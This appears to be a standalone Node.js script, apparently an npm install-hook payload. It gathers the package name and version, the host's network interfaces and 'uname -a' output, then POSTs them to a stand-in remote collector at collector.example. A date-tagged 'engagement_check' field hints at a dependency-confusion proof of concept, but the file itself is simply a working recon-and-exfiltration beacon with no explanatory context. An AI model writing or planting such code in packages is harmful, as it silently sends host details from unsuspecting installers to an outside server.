const os = require('os');
const https = require('https');
const { exec } = require('child_process');
const engagement_check = '2024-06-28';
const packageInfo = `${process.env.npm_package_name}@${process.env.npm_package_version}`;
const host_ip = os.networkInterfaces();
const command = 'uname -a';
const serverUrl = 'https://collector.example/api';

exec(command, (error, stdout) => {
  const host_intel = stdout.replace(/[\n\r]/g, '  ');
  const body = JSON.stringify({ engagement_check, host_ip, packageInfo, host_intel });
  https.request(serverUrl, { method: 'POST' }).end(body);
});
